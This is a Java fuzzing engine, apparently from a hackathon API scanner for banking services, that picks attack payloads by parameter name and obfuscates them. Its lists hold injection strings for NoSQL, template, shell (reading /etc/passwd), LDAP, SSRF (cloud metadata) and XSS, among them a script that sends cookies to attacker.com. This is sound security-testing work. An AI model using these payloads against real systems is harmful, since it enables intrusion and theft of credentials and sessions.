// scanners/fuzzing/EnhancedFuzzingEngine.java
package scanners.fuzzing;

import java.util.*;

public class EnhancedFuzzingEngine {

    private PayloadLibrary payloadLibrary = new PayloadLibrary();
    private ObfuscationEngine obfuscationEngine = new ObfuscationEngine();

    public List<String> generatePriorityPayloads(ApiParameter parameter) {
        List<String> priorityPayloads = new ArrayList<>();

        String paramName = parameter.getName().toLowerCase();
        String paramType = parameter.getType().toLowerCase();
        ParameterLocation location = parameter.getLocation();

        // 🔥 NoSQL Injection для JSON параметров
        if (paramType.contains("object") || paramType.contains("json") ||
                paramName.contains("filter") || paramName.contains("query")) {
            priorityPayloads.addAll(Arrays.asList(
                    "{\"$ne\": \"\"}",
                    "{\"$gt\": \"\"}",
                    "{\"$regex\": \".*\"}",
                    "{\"$where\": \"return true\"}",
                    "{\"$exists\": true}"
            ));
        }

        // 🔥 SSTI (Template Injection)
        if (paramName.contains("reason") || paramName.contains("reference") ||
                paramName.contains("description") || paramName.contains("name")) {
            priorityPayloads.addAll(Arrays.asList(
                    "{{7*7}}",
                    "${7*7}",
                    "<%= 7 * 7 %>",
                    "#{7*7}",
                    "${{7*7}}"
            ));
        }

        // 🔥 Command Injection для текстовых полей
        if (paramName.contains("name") || paramName.contains("reference") ||
                paramName.contains("creditor")) {
            priorityPayloads.addAll(Arrays.asList(
                    "; cat /etc/passwd",
                    "| whoami",
                    "`id`",
                    "$(id)",
                    "&& ls -la"
            ));
        }

        // 🔥 LDAP Injection
        if (paramName.contains("client_id") || paramName.contains("user") ||
                paramName.contains("search")) {
            priorityPayloads.addAll(Arrays.asList(
                    "*)(uid=*))(|(uid=*",
                    "*",
                    "admin)(&)",
                    ")(cn=*))(%00"
            ));
        }

        // 🔥 SSRF пейлоады (если параметр может быть URL)
        if (paramName.contains("url") || paramName.contains("callback") ||
                paramName.contains("endpoint")) {
            priorityPayloads.addAll(Arrays.asList(
                    "http://169.254.169.254/latest/meta-data/",
                    "http://localhost:8080/admin",
                    "file:///etc/passwd",
                    "http://internal.api.local/secret"
            ));
        }

        // 🔥 XSS для UI-отображения (если данные показываются в интерфейсе)
        if (paramName.contains("nickname") || paramName.contains("reason") ||
                paramName.contains("creditor_name") || paramName.contains("reference")) {
            priorityPayloads.addAll(Arrays.asList(
                    "<img src=x onerror=alert('XSS')>",
                    "<script>fetch('http://attacker.com?leak='+document.cookie)</script>",
                    "<svg onload=alert(1)>",
                    "javascript:alert('Hackathon')"
            ));
        }

        // 🔥 Банковские бизнес-логики
        if (paramName.contains("amount") || paramName.contains("balance") ||
                paramName.contains("limit")) {
            priorityPayloads.addAll(Arrays.asList(
                    "-999999999.99",
                    "0.0000001",
                    "999999999999.99",
                    "1.7976931348623158e+308",
                    "NaN",
                    "Infinity"
            ));
        }

        return priorityPayloads;
    }

    public List<String> generateAdvancedPayloads(ApiParameter parameter) {
        List<String> advancedPayloads = new ArrayList<>();
        List<String> basePayloads = generatePriorityPayloads(parameter);

        // Применяем обфускацию ко всем базовым пейлоадам
        for (String payload : basePayloads) {
            advancedPayloads.add(payload); // оригинал
            advancedPayloads.addAll(obfuscationEngine.advancedObfuscate(payload));
        }

        // Ограничиваем количество для производительности
        if (advancedPayloads.size() > 100) {
            advancedPayloads = advancedPayloads.subList(0, 100);
        }

        return advancedPayloads;
    }
}